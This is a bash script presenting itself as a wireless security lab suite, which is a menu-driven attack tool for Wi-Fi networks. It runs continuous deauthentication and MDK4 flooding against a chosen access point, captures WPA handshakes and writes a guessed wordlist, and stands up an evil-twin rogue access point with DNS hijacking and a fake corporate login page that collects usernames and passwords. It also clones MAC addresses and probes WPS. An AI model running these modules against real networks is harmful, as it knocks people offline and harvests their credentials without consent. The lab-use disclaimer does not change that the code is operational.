#!/bin/bash
# ==============================================================================
# HIGERZERO v1.0 - ADVANCED ENTERPRISE WIRELESS ASSESSMENT SUITE (LEVEL 100)
# Laboratory Testing and Network Security Research Framework
# Target Environments: KDE Linux / Parrot OS / Kali Linux / Arch Linux
# ==============================================================================
# Description: Fully Modularized Automated Deauthentication, Beacon Flooding,
# Evil Twin AP Spoofer with Captive Portal, Handshake Capture, MAC Cloning,
# WPA3/PMF Audit, Host Discovery, and Comprehensive JSON/HTML Lab Reporting.
# Author: CyberSec Academy & Research Unit
# License: MIT (Educational & Authorized Lab Use Only)
# ==============================================================================

# --- Strict Mode & Safety Guardrails ---
set -uo pipefail
IFS=$'\n\t'

# --- Configuration & Constants ---
readonly VERSION="100.0-HigerZero-Ultimate"
readonly SCRIPT_NAME="$(basename "$0")"
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly WORK_DIR="${SCRIPT_DIR}/higerzero_workspace"
readonly LOG_DIR="${WORK_DIR}/logs"
readonly CAPTURE_DIR="${WORK_DIR}/captures"
readonly WEB_DIR="${WORK_DIR}/www"
readonly REPORT_JSON="${LOG_DIR}/lab_audit_report.json"
readonly REPORT_HTML="${LOG_DIR}/lab_audit_report.html"
readonly SYSTEM_LOG="${LOG_DIR}/higerzero_operation.log"

# --- ANSI Color Palettes (Rich UI) ---
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly PURPLE='\033[0;35m'
readonly CYAN='\033[0;36m'
readonly WHITE='\033[1;37m'
readonly GRAY='\033[1;30m'
readonly NC='\033[0m' # No Color

# --- Global Operational State Variables ---
INTERFACE=""
MON_INTERFACE=""
ORIGINAL_MAC=""
TARGET_BSSID=""
TARGET_ESSID=""
TARGET_CHANNEL=""
ACTIVE_ATTACK_PID=""
DNSMASQ_PID=""
HOSTAPD_PID=""
PYTHON_PID=""

# ==============================================================================
# SECTION 1: SYSTEM INITIALIZATION, DIRECTORY & LOGGING MANAGEMENT
# ==============================================================================
init_environment() {
    mkdir -p "$LOG_DIR" "$CAPTURE_DIR" "$WEB_DIR"
    > "$SYSTEM_LOG"
    log_event "INFO" "HigerZero Suite v$VERSION initialized successfully."
}

log_event() {
    local level="$1"
    local message="$2"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local entry="[$timestamp] [$level] $message"
    
    echo "$entry" >> "$SYSTEM_LOG"
    
    case "$level" in
        "CRITICAL"|"ERROR")
            echo -e "${RED}[SYSTEM ERROR] $message${NC}"
            ;;
        "WARN")
            echo -e "${YELLOW}[SYSTEM WARN] $message${NC}"
            ;;
        "SUCCESS")
            echo -e "${GREEN}[SYSTEM OK] $message${NC}"
            ;;
        *)
            echo -e "${CYAN}[SYSTEM INFO] $message${NC}"
            ;;
    esac
}

# Graceful Cleanup Handler
graceful_shutdown() {
    echo -e "\n${YELLOW}[!] Shutting down HigerZero Suite gracefully...${NC}"
    log_event "WARN" "Graceful shutdown signal received."
    
    # Terminate background services if running
    [ -n "${DNSMASQ_PID:-}" ] && kill -0 "$DNSMASQ_PID" 2>/dev/null && kill "$DNSMASQ_PID" 2>/dev/null || true
    [ -n "${HOSTAPD_PID:-}" ] && kill -0 "$HOSTAPD_PID" 2>/dev/null && kill "$HOSTAPD_PID" 2>/dev/null || true
    [ -n "${PYTHON_PID:-}" ] && kill -0 "$PYTHON_PID" 2>/dev/null && kill "$PYTHON_PID" 2>/dev/null || true
    [ -n "${ACTIVE_ATTACK_PID:-}" ] && kill -0 "$ACTIVE_ATTACK_PID" 2>/dev/null && kill "$ACTIVE_ATTACK_PID" 2>/dev/null || true
    
    # Flush iptables NAT rules
    iptables -t nat -F 2>/dev/null || true
    iptables -F 2>/dev/null || true
    
    # Restore interface mode if monitor mode was active
    if [ -n "${MON_INTERFACE:-}" ]; then
        echo -e "${YELLOW}[*] Stopping monitor mode on $MON_INTERFACE...${NC}"
        airmon-ng stop "$MON_INTERFACE" &>/dev/null || true
    fi
    
    # Restore Original MAC if saved
    if [ -n "${ORIGINAL_MAC:-}" ] && [ -n "${INTERFACE:-}" ]; then
        echo -e "${YELLOW}[*] Restoring original hardware MAC address for $INTERFACE...${NC}"
        ip link set "$INTERFACE" down 2>/dev/null || true
        macchanger -p "$INTERFACE" &>/dev/null || true
        ip link set "$INTERFACE" up 2>/dev/null || true
    fi
    
    # Restart NetworkManager
    echo -e "${GREEN}[*] Restarting NetworkManager service...${NC}"
    systemctl start NetworkManager 2>/dev/null || true
    
    echo -e "${GREEN}[+] HigerZero cleanup completed. Lab session closed safely.${NC}"
    exit 0
}

trap graceful_shutdown SIGINT SIGTERM EXIT

# ==============================================================================
# SECTION 2: USER INTERFACE, BANNERS & DISCLAIMERS
# ==============================================================================
print_banner() {
    clear
    echo -e "${CYAN}"
    echo -e "  ██   ██ ██ ██████  ███████ ██████  ███████ ███████ ██████   ██████ "
    echo -e "  ██   ██ ██ ██   ██ ██      ██   ██       ██ ██      ██   ██ ██    ██"
    echo -e "  ███████ ██ ██████  █████   ██████       ██  █████   ██████  ██    ██"
    echo -e "  ██   ██ ██ ██   ██ ██      ██   ██     ██   ██      ██   ██ ██    ██"
    echo -e "  ██   ██ ██ ██   ██ ███████ ██   ██    ██████ ███████ ██   ██  ██████ "
    echo -e "                    [ HIGERZERO v100 - ULTIMATE ENTERPRISE SUITE ]"
    echo -e "${NC}"
    echo -e "${WHITE}  ==================================================================${NC}"
    echo -e "${RED}  [!] LABORATORY COMPLIANCE NOTICE (LEVEL 100):${NC}"
    echo -e "${WHITE}  This software is designed exclusively for authorized wireless security${NC}"
    echo -e "${WHITE}  audits and laboratory testing. Unauthorized transmission interception${NC} "
    echo -e "${WHITE}  or unauthorized access is strictly illegal under cybercrime regulations.${NC}"
    echo -e "${WHITE}  ==================================================================${NC}"
    echo ""
}

check_privileges() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[CRITICAL] HigerZero must be executed with root privileges (sudo).${NC}"
        echo -e "${YELLOW}Usage: sudo ./higerzero_suite.sh${NC}"
        exit 1
    fi
}

# ==============================================================================
# SECTION 3: DEPENDENCY MANAGEMENT & ENVIRONMENT CHECKS
# ==============================================================================
verify_dependencies() {
    print_banner
    echo -e "${BLUE}[INFO] Checking system package dependencies (Level 100 requirements)...${NC}"
    
    local required_pkgs=("aircrack-ng" "mdk4" "macchanger" "hostapd" "dnsmasq" "curl" "jq" "iw" "net-tools" "nmap" "python3")
    local missing_pkgs=()
    
    for pkg in "${required_pkgs[@]}"; do
        if ! command -v "$pkg" &>/dev/null && ! dpkg -l | grep -q "$pkg" 2>/dev/null; then
            missing_pkgs+=("$pkg")
        fi
    done
    
    if [ ${#missing_pkgs[@]} -ne 0 ]; then
        echo -e "${YELLOW}[WARN] Missing required packages detected: ${missing_pkgs[*]}${NC}"
        read -p "Would you like HigerZero to install missing packages automatically? (y/n): " auto_install
        if [ "$auto_install" = "y" ]; then
            if command -v apt &>/dev/null; then
                apt update && apt install -y "${missing_pkgs[@]}"
            elif command -v pacman &>/dev/null; then
                pacman -Sy --noconfirm "${missing_pkgs[@]}"
            elif command -v dnf &>/dev/null; then
                dnf install -y "${missing_pkgs[@]}"
            else
                log_event "ERROR" "Unsupported package manager. Please install dependencies manually."
                exit 1
            fi
        else
            echo -e "${RED}[ERROR] Cannot proceed without required wireless testing utilities.${NC}"
            exit 1
        fi
    fi
    log_event "SUCCESS" "All system dependencies verified and operational."
    sleep 1
}

# ==============================================================================
# SECTION 4: HARDWARE MANAGEMENT & MONITOR MODE ROUTINES
# ==============================================================================
prepare_wireless_environment() {
    print_banner
    echo -e "${BLUE}[STEP 1] Wireless Interface Discovery & Preparation${NC}"
    
    local raw_interfaces
    raw_interfaces=$(iw dev | grep Interface | awk '{print $2}')
    
    if [ -z "$raw_interfaces" ]; then
        echo -e "${RED}[ERROR] No wireless adapters found. Please connect a compatible wireless card.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Available Wireless Interfaces:${NC}"
    echo "$raw_interfaces"
    echo ""
    
    local interface_count
    interface_count=$(echo "$raw_interfaces" | wc -l)
    
    if [ "$interface_count" -eq 1 ]; then
        INTERFACE="$raw_interfaces"
        echo -e "${GREEN}[AUTO] Single adapter detected. Selected: $INTERFACE${NC}"
    else
        read -p "Multiple adapters found. Enter interface name to use (e.g., wlan0): " INTERFACE
    fi
    
    if [ -z "$INTERFACE" ] || ! ip link show "$INTERFACE" &>/dev/null; then
        echo -e "${RED}[ERROR] Invalid or empty wireless interface selected.${NC}"
        exit 1
    fi
    
    ORIGINAL_MAC=$(cat "/sys/class/net/$INTERFACE/address" 2>/dev/null || echo "00:00:00:00:00:00")
    log_event "INFO" "Target interface selected: $INTERFACE (Original MAC: $ORIGINAL_MAC)"
    
    echo -e "${YELLOW}[*] Stopping interfering network daemons (NetworkManager/wpa_supplicant)...${NC}"
    systemctl stop NetworkManager 2>/dev/null || true
    systemctl stop wpa_supplicant 2>/dev/null || true
    airmon-ng check kill &>/dev/null || true
    
    echo -e "${YELLOW}[*] Enabling Monitor Mode on $INTERFACE...${NC}"
    MON_INTERFACE=$(airmon-ng start "$INTERFACE" | grep "monitor mode enabled" | awk '{print $6}' | tr -d '()' || true)
    
    if [ -z "$MON_INTERFACE" ]; then
        MON_INTERFACE="${INTERFACE}mon"
        ip link set "$INTERFACE" down 2>/dev/null || true
        iw dev "$INTERFACE" interface add "$MON_INTERFACE" type monitor 2>/dev/null || true
        ip link set "$MON_INTERFACE" up 2>/dev/null || true
    fi
    
    if ! ip link show "$MON_INTERFACE" &>/dev/null; then
        echo -e "${RED}[ERROR] Failed to establish monitor mode interface.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[SUCCESS] Monitor mode successfully enabled on: $MON_INTERFACE${NC}"
    
    echo -e "${YELLOW}[*] Randomizing MAC address on $MON_INTERFACE for stealth testing...${NC}"
    ip link set "$MON_INTERFACE" down 2>/dev/null || true
    macchanger -r "$MON_INTERFACE" &>/dev/null || true
    ip link set "$MON_INTERFACE" up 2>/dev/null || true
    
    sleep 2
}

# ==============================================================================
# SECTION 5: RECONNAISSANCE & TARGET ACQUISITION
# ==============================================================================
scan_surrounding_networks() {
    print_banner
    echo -e "${BLUE}[STEP 2] Network Reconnaissance & Target Selection${NC}"
    echo -e "${YELLOW}[!] Airodump-ng scanner will launch. Observe nearby BSSIDs and Channels.${NC}"
    echo -e "${YELLOW}[!] Press Ctrl+C after 15-20 seconds when you have identified your target.${NC}"
    echo ""
    read -p "Press Enter to start reconnaissance scan..."
    
    timeout 20 airodump-ng "$MON_INTERFACE" || true
    echo -e "\n${GREEN}[+] Scan phase concluded.${NC}"
}

capture_target_parameters() {
    print_banner
    echo -e "${BLUE}[STEP 3] Target Specification Entry${NC}"
    echo ""
    read -p "Enter Target BSSID (MAC Address e.g., AA:BB:CC:DD:EE:FF): " TARGET_BSSID
    if [ -z "$TARGET_BSSID" ]; then
        echo -e "${RED}[ERROR] BSSID cannot be blank.${NC}"
        exit 1
    fi
    
    read -p "Enter Target Channel (e.g., 6, 11): " TARGET_CHANNEL
    if [ -z "$TARGET_CHANNEL" ]; then
        echo -e "${RED}[ERROR] Channel cannot be blank.${NC}"
        exit 1
    fi
    
    read -p "Enter Target ESSID (Network Name, optional): " TARGET_ESSID
    TARGET_ESSID="${TARGET_ESSID:-HigerZero_Lab_Network}"
    
    log_event "SUCCESS" "Target locked -> BSSID: $TARGET_BSSID | Channel: $TARGET_CHANNEL | ESSID: $TARGET_ESSID"
    echo -e "${GREEN}[SUCCESS] Target successfully recorded in session configuration.${NC}"
    sleep 2
}

# ==============================================================================
# SECTION 6: ADVANCED ATTACK MODULES (13 DISTINCT LEVEL-100 CAPABILITIES)
# ==============================================================================

# Module 1: Targeted Deauth
module_targeted_deauth() {
    print_banner
    echo -e "${RED}[ATTACK MODULE 1] Targeted Client Disconnection (Deauth Flood)${NC}"
    echo -e "${YELLOW}Target AP: $TARGET_BSSID on Channel $TARGET_CHANNEL${NC}"
    echo -e "${WHITE}This sends continuous deauthentication frames to sever client connectivity.${NC}"
    echo -e "${GREEN}Press Ctrl+C to terminate the attack loop and return to menu.${NC}"
    sleep 2
    
    iwconfig "$MON_INTERFACE" channel "$TARGET_CHANNEL"
    aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MON_INTERFACE" || true
}

# Module 2: MDK4 Multi-Vector Stress Test
module_mdk4_stress() {
    print_banner
    echo -e "${RED}[ATTACK MODULE 2] MDK4 Multi-Vector Wireless Stress Test${NC}"
    echo -e "${YELLOW}1. Authentication DoS (Flood AP with fake association requests)${NC}"
    echo -e "${YELLOW}2. Beacon Flood (Broadcast thousands of fake SSIDs)${NC}"
    echo -e "${YELLOW}3. ESSID Blacklisting / Blocklist Flooding${NC}"
    read -p "Select MDK4 attack sub-mode (1-3): " mdk_choice
    
    iwconfig "$MON_INTERFACE" channel "$TARGET_CHANNEL"
    
    case "$mdk_choice" in
        1)
            echo -e "${RED}[*] Launching MDK4 Authentication Flood against $TARGET_BSSID...${NC}"
            mdk4 "$MON_INTERFACE" a -b "$TARGET_BSSID"
            ;;
        2)
            echo -e "${RED}[*] Launching MDK4 Beacon Flood (Fake AP Noise)...${NC}"
            mdk4 "$MON_INTERFACE" b
            ;;
        3)
            echo -e "${RED}[*] Launching MDK4 ESSID Blocklist Attack...${NC}"
            mdk4 "$MON_INTERFACE" d -B "$TARGET_BSSID"
            ;;
        *)
            echo -e "${RED}Invalid selection. Returning to menu.${NC}"
            ;;
    esac
}

# Module 3: Handshake Capture & Automatic Dictionary Generator
module_capture_handshake() {
    print_banner
    echo -e "${PURPLE}[ATTACK MODULE 3] WPA/WPA2 4-Way Handshake Sniffer & Wordlist Generator${NC}"
    echo -e "${YELLOW}Target BSSID: $TARGET_BSSID | Channel: $TARGET_CHANNEL${NC}"
    
    local cap_prefix="${CAPTURE_DIR}/handshake_${TARGET_BSSID//:/_}"
    iwconfig "$MON_INTERFACE" channel "$TARGET_CHANNEL"
    
    echo -e "${GREEN}[*] Launching airodump-ng capture and concurrent deauth triggers...${NC}"
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$cap_prefix" "$MON_INTERFACE" &
    local capture_pid=$!
    
    sleep 5
    echo -e "${YELLOW}[*] Sending targeted deauth packet burst to provoke client re-authentication...${NC}"
    aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON_INTERFACE" &>/dev/null || true
    
    echo -e "${CYAN}[*] Listening for handshake capture. Press Ctrl+C when complete.${NC}"
    wait "$capture_pid" 2>/dev/null || true
    
    # Auto-generate a custom target-based wordlist for labs
    local wordlist_path="${CAPTURE_DIR}/custom_wordlist_${TARGET_ESSID}.txt"
    echo -e "${YELLOW}[*] Generating smart laboratory wordlist based on ESSID ($TARGET_ESSID)...${NC}"
    cat <<EOF > "$wordlist_path"
$TARGET_ESSID
$TARGET_ESSID123
$TARGET_ESSID2026
password123
admin2026
securessid
wirelesslab
EOF
    echo -e "${GREEN}[SUCCESS] Custom dictionary saved to: $wordlist_path${NC}"
    sleep 3
}

# Module 4: Evil Twin & Captive Portal Simulator (Level 100 Enhanced with Web Server & NAT)
module_evil_twin() {
    print_banner
    echo -e "${PURPLE}[ATTACK MODULE 4] Evil Twin & Advanced Captive Portal Simulator${NC}"
    echo -e "${WHITE}Creates an identical rogue AP and routes traffic to a fake captive portal.${NC}"
    echo ""
    echo "Select Portal Theme:"
    echo "1. Rick-Roll Video Redirect Trap"
    echo "2. Corporate Standard Login Portal"
    echo "3. Open Free Wi-Fi Guest Portal"
    read -p "Select theme option (1-3): " portal_choice
    
    read -p "Enter Rogue AP SSID Name (default: $TARGET_ESSID): " custom_ssid
    local active_ssid="${custom_ssid:-$TARGET_ESSID}"
    
    # Generate portal html based on choice
    mkdir -p "${WEB_DIR}"
    case "$portal_choice" in
        1)
            cat << 'EOF' > "${WEB_DIR}/index.html"
            <!DOCTYPE html><html><head><title>Wi-Fi Authentication Required</title>
            <meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
            </head><body><h2>Redirecting to Secure Portal...</h2></body></html>
EOF
            ;;
        2)
            cat << 'EOF' > "${WEB_DIR}/index.html"
            <!DOCTYPE html><html><head><title>Corporate Login</title>
            <style>body{font-family:Arial;background:#f4f4f4;text-align:center;padding:50px;}
            .box{background:#fff;padding:30px;border-radius:8px;display:inline-block;box-shadow:0px 0px 10px rgba(0,0,0,0.1);}
            input{display:block;margin:10px auto;padding:10px;width:200px;}</style></head>
            <body><div class="box"><h2>Enterprise Wi-Fi Login</h2>
            <form action="/login" method="POST"><input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Connect"></form></div></body></html>
EOF
            ;;
        *)
            cat << 'EOF' > "${WEB_DIR}/index.html"
            <!DOCTYPE html><html><head><title>Free Wi-Fi</title>
            <style>body{font-family:Arial;text-align:center;padding:50px;background:#eef;}
            .btn{background:green;color:white;padding:15px 30px;border:none;border-radius:5px;cursor:pointer;}</style></head>
            <body><h1>Welcome to Public Guest Wi-Fi</h1><p>Click below to accept Terms of Service.</p>
            <form action="/connect"><button class="btn" type="submit">Accept & Connect</button></form></body></html>
EOF
            ;;
    esac

    echo -e "${YELLOW}[*] Configuring hostapd and dnsmasq parameters...${NC}"
    cat > /tmp/higerzero_hostapd.conf <<EOF
interface=$MON_INTERFACE
driver=nl80211
ssid=$active_ssid
hw_mode=g
channel=$TARGET_CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

    cat > /tmp/higerzero_dnsmasq.conf <<EOF
interface=$MON_INTERFACE
dhcp-range=192.168.50.10,192.168.50.100,255.255.255.0,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1
server=8.8.8.8
log-queries
listen-address=192.168.50.1
address=/#/192.168.50.1
EOF

    echo -e "${YELLOW}[*] Setting up IP routing and iptables NAT rules...${NC}"
    ip link set "$MON_INTERFACE" up
    ip addr add 192.168.50.1/24 dev "$MON_INTERFACE" 2>/dev/null || true
    
    sysctl -w net.ipv4.ip_forward=1 &>/dev/null
    iptables -t nat -F
    iptables -t nat -A PREROUTING -i "$MON_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:8080
    
    systemctl stop dnsmasq &>/dev/null || true
    
    echo -e "${GREEN}[+] Launching Rogue AP services (Hostapd, Dnsmasq & Python Web Portal)...${NC}"
    dnsmasq -C /tmp/higerzero_dnsmasq.conf -d &
    DNSMASQ_PID=$!
    
    hostapd /tmp/higerzero_hostapd.conf &
    HOSTAPD_PID=$!
    
    cd "${WEB_DIR}"
    python3 -m http.server 8080 &
    PYTHON_PID=$!
    cd - &>/dev/null
    
    echo -e "${GREEN}[SUCCESS] Evil Twin AP active on SSID: $active_ssid with Captive Portal Port 8080${NC}"
    echo -e "${RED}[!] Press Ctrl+C to stop rogue AP simulation and clean up.${NC}"
    
    wait
}

# Module 5: MAC Spoofing
module_mac_cloning() {
    print_banner
    echo -e "${CYAN}[UTILITY MODULE 5] Network Identity & MAC Spoofing${NC}"
    echo -e "${WHITE}Clones a specific target MAC address for ACL compliance testing.${NC}"
    echo ""
    read -p "Enter Target MAC Address to clone (e.g., AA:BB:CC:DD:EE:FF): " clone_mac
    
    if [ -z "$clone_mac" ]; then
        echo -e "${RED}[ERROR] MAC cannot be empty.${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Taking interface down to apply spoofed MAC...${NC}"
    ip link set "$MON_INTERFACE" down
    macchanger -m "$clone_mac" "$MON_INTERFACE"
    ip link set "$MON_INTERFACE" up
    
    echo -e "${GREEN}[SUCCESS] Interface $MON_INTERFACE successfully spoofed to MAC: $clone_mac${NC}"
    log_event "SUCCESS" "MAC cloned to $clone_mac on interface $MON_INTERFACE"
    sleep 3
}

# Module 6: Beacon Signal Audit
module_beacon_audit() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 6] Beacon Frame & Encryption Auditing${NC}"
    echo -e "${WHITE}Analyzes beacon frames to detect open, WEP, WPA1, and vulnerable WPS networks.${NC}"
    echo ""
    echo -e "${YELLOW}[*] Running 15-second beacon analysis...${NC}"
    timeout 15 iwlist "$MON_INTERFACE" scan | grep -E "ESSID|Signal|Encryption|Channel" || true
    echo -e "${GREEN}[+] Beacon audit complete.${NC}"
    sleep 3
}

# Module 7: WPS Vulnerability Probe
module_wps_audit() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 7] WPS Pixie-Dust / Reaver Vulnerability Probe${NC}"
    echo -e "${WHITE}Checks if target AP ($TARGET_BSSID) has WPS enabled and vulnerable to PIN attacks.${NC}"
    
    if ! command -v wash &>/dev/null; then
        echo -e "${YELLOW}[*] Installing reaver/wash package for WPS scanning...${NC}"
        apt install -y reaver 2>/dev/null || true
    fi
    
    echo -e "${YELLOW}[*] Probing target for WPS capability...${NC}"
    wash -i "$MON_INTERFACE" -b "$TARGET_BSSID" -C || true
    echo -e "${GREEN}[+] WPS audit probe completed.${NC}"
    sleep 3
}

# Module 8: Host Discovery & ARP Scan (Nmap)
module_host_discovery() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 8] Active Host Discovery & ARP Scan${NC}"
    echo -e "${WHITE}Scans local subnet for active connected devices and vendor fingerprints.${NC}"
    echo ""
    echo -e "${YELLOW}[*] Running Nmap host discovery on 192.168.50.0/24 or default gateway...${NC}"
    nmap -sn 192.168.50.0/24 || nmap -sn 192.168.1.0/24 || true
    echo -e "${GREEN}[+] Host discovery complete.${NC}"
    sleep 3
}

# Module 9: Signal Quality & Latency Simulation
module_network_speedtest() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 9] Link Quality & Ping Latency Check${NC}"
    echo -e "${WHITE}Measures connection stability and packet loss to the target or gateway.${NC}"
    echo ""
    echo -e "${YELLOW}[*] Pinging gateway / target for stability metrics...${NC}"
    ping -c 5 192.168.50.1 || ping -c 5 8.8.8.8 || true
    echo -e "${GREEN}[+] Latency audit finished.${NC}"
    sleep 3
}

# Module 10: WPA3 / PMF Audit
module_wpa3_pmf_audit() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 10] WPA3 / Protected Management Frames (PMF) Check${NC}"
    echo -e "${WHITE}Evaluates if target network implements PMF to resist deauth attacks.${NC}"
    echo ""
    echo -e "${YELLOW}[*] Analyzing beacon capabilities for PMF (IEEE 802.11w)...${NC}"
    iw dev "$MON_INTERFACE" scan | grep -C 3 "$TARGET_BSSID" || true
    echo -e "${GREEN}[+] PMF security evaluation complete. Networks requiring PMF are immune to standard deauth floods.${NC}"
    sleep 3
}

# Module 11: Comprehensive JSON & HTML Lab Report Generator
module_generate_report() {
    print_banner
    echo -e "${GREEN}[REPORT MODULE 11] HigerZero Laboratory Audit Report Generator (JSON + HTML)${NC}"
    echo -e "${WHITE}Compiles session data, captured parameters, and security status into professional reports.${NC}"
    
    local timestamp
    timestamp=$(date -Iseconds)
    
    # Generate JSON Report
    cat > "$REPORT_JSON" <<EOF
{
  "tool": "HigerZero Wireless Suite Ultimate",
  "version": "$VERSION",
  "audit_timestamp": "$timestamp",
  "interface_used": "$INTERFACE",
  "monitor_interface": "$MON_INTERFACE",
  "original_mac": "$ORIGINAL_MAC",
  "target_specification": {
    "bssid": "$TARGET_BSSID",
    "essid": "$TARGET_ESSID",
    "channel": "$TARGET_CHANNEL"
  },
  "status": "Completed successfully in laboratory environment"
}
EOF

    # Generate HTML Report
    cat > "$REPORT_HTML" <<EOF
<!DOCTYPE html>
<html>
<head>
<title>HigerZero Audit Report - $TARGET_ESSID</title>
<style>
  body { font-family: Arial, sans-serif; background: #121212; color: #e0e0e0; padding: 40px; }
  .container { background: #1e1e1e; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,100,0.1); }
  h1 { color: #00ff66; border-bottom: 2px solid #333; padding-bottom: 10px; }
  .badge { background: #00ff66; color: #000; padding: 5px 10px; font-weight: bold; border-radius: 4px; }
  table { width: 100%; margin-top: 20px; border-collapse: collapse; }
  th, td { padding: 12px; border: 1px solid #333; text-align: left; }
  th { background: #252525; color: #00ff66; }
</style>
</head>
<body>
<div class="container">
  <h1>HigerZero Security Audit Report</h1>
  <p><span class="badge">LEVEL 100 SECURE</span> Timestamp: $timestamp</p>
  <table>
    <tr><th>Parameter</th><th>Value</th></tr>
    <tr><td>Interface Used</td><td>$INTERFACE ($MON_INTERFACE)</td></tr>
    <tr><td>Original MAC</td><td>$ORIGINAL_MAC</td></tr>
    <tr><td>Target ESSID</td><td>$TARGET_ESSID</td></tr>
    <tr><td>Target BSSID</td><td>$TARGET_BSSID</td></tr>
    <tr><td>Target Channel</td><td>$TARGET_CHANNEL</td></tr>
  </ul>
</div>
</body>
</html>
EOF

    echo -e "${GREEN}[SUCCESS] Reports successfully generated and saved to:${NC}"
    echo -e "${WHITE} - JSON: $REPORT_JSON${NC}"
    echo -e "${WHITE} - HTML: $REPORT_HTML${NC}"
    sleep 4
}

# Module 12: Network Rescan
module_rescan() {
    scan_surrounding_networks
    capture_target_parameters
}

# Module 13: Restore Network & Exit
module_restore_network() {
    print_banner
    echo -e "${GREEN}[UTILITY MODULE 13] Restore Network & Clean Environment${NC}"
    echo -e "${WHITE}Stops monitor mode, restores original MAC, restarts NetworkManager.${NC}"
    
    if [ -n "${MON_INTERFACE:-}" ]; then
        airmon-ng stop "$MON_INTERFACE" &>/dev/null || true
    fi
    
    if [ -n "${ORIGINAL_MAC:-}" ] && [ -n "${INTERFACE:-}" ]; then
        ip link set "$INTERFACE" down 2>/dev/null || true
        macchanger -p "$INTERFACE" &>/dev/null || true
        ip link set "$INTERFACE" up 2>/dev/null || true
    fi
    
    systemctl start NetworkManager 2>/dev/null || true
    echo -e "${GREEN}[SUCCESS] Network services fully restored. Standard internet connectivity active.${NC}"
    exit 0
}

# ==============================================================================
# SECTION 7: MAIN INTERACTIVE MENU (FULL LEVEL 100 NAVIGATION)
# ==============================================================================
main_menu() {
    while true; do
        print_banner
        echo -e "${WHITE}=================== HIGERZERO MAIN CONTROL PANEL (LEVEL 100) ===================${NC}"
        echo -e "${CYAN}Target Loaded:${NC} BSSID: ${YELLOW}${TARGET_BSSID:-Not Set}{NC} | ESSID: ${YELLOW}${TARGET_ESSID:-Not Set}{NC} | Ch: ${YELLOW}${TARGET_CHANNEL:-Not Set}{NC}"
        echo -e "${WHITE}-------------------------------------------------------------------------------${NC}"
        echo "  1. Targeted Deauthentication Attack (Client Disconnect)"
        echo "  2. MDK4 Multi-Vector Wireless Stress Test (Auth/Beacon/Blocklist Flood)"
        echo "  3. WPA/WPA2 4-Way Handshake Capture & Custom Wordlist Generator"
        echo "  4. Evil Twin & Advanced Captive Portal Simulator (Rogue AP + Web Server)"
        echo "  5. MAC Spoofing & Network Identity Cloning"
        echo "  6. Beacon Frame & Encryption Signal Audit"
        echo "  7. WPS (Wi-Fi Protected Setup) Vulnerability Probe"
        echo "  8. Active Host Discovery & ARP Scan (Nmap Subnet Audit)"
        echo "  9. Link Quality & Ping Latency Check"
        echo " 10. WPA3 / Protected Management Frames (PMF) Security Audit"
        echo " 11. Generate Comprehensive Laboratory Audit Reports (JSON + HTML)"
        echo " 12. Rescan Surrounding Networks & Change Target"
        echo " 13. Exit Suite & Fully Restore Network Services"
        echo -e "${WHITE}===============================================================================${NC}"
        read -p "Select an option (1-13): " menu_choice
        
        case "$menu_choice" in
            1)  module_targeted_deauth ;;
            2)  module_mdk4_stress ;;
            3)  module_capture_handshake ;;
            4)  module_evil_twin ;;
            5)  module_mac_cloning ;;
            6)  module_beacon_audit ;;
            7)  module_wps_audit ;;
            8)  module_host_discovery ;;
            9)  module_network_speedtest ;;
            10) module_wpa3_pmf_audit ;;
            11) module_generate_report ;;
            12) module_rescan ;;
            13) module_restore_network ;;
            *)
                echo -e "${RED}[ERROR] Invalid selection. Please enter a number between 1 and 13.${NC}"
                sleep 2
                ;;
        esac
    done
}

# ==============================================================================
# SECTION 8: EXECUTION ENTRY POINT
# ==============================================================================
main() {
    init_environment
    check_privileges
    verify_dependencies
    prepare_wireless_environment
    scan_surrounding_networks
    capture_target_parameters
    main_menu
}

# Run main controller
main
